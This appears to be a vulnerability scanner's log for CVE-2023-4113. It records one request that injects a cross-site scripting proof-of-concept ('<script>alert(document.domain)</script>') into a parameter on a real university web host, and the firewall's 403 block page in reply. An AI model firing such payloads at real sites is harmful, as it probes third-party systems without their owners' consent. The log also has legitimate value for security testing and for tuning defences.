@@ -1,0 +1,25 @@
+[CVE-2023-4113] Dumped HTTP request for https://cedrr.le.unimelb.edu.au/index.php?controller=pjFrontPublic&action=pjActionServices&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+
+
+GET /index.php?controller=pjFrontPublic&action=pjActionServices&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
+Host: cedrr.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2023-4113] Dumped HTTP response https://cedrr.le.unimelb.edu.au/index.php?controller=pjFrontPublic&action=pjActionServices&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 833
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3239149=zHKjhQkKSnqARDZY8rdyswRyk2gAAAAAQUIPAAAAAAD5UlztW4ivXpzesbz4tUAj; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3239149=UrO4EZw+dE/E37arov5JAwRyk2gAAAAAQNo0fIHg7jq7OkeAdOsnEw==; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 12-10108147-0 0NNN RT(1754493445201 13) q(0 -1 -1 -1) r(0 -1) B15(1,903758,0) U18
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/c-O-Scotland-Lady-Macb-Ile-And-Seyward-my-forge-" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=12-10108147-0%200NNN%20RT%281754493445201%2013%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29%20B15%281%2c903758%2c0%29%20U18&incident_id=237000430032579424-51995329367444172&edet=15&cinfo=01000000&rpinfo=0&mth=GET" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 237000430032579424-51995329367444172</iframe></body></html>
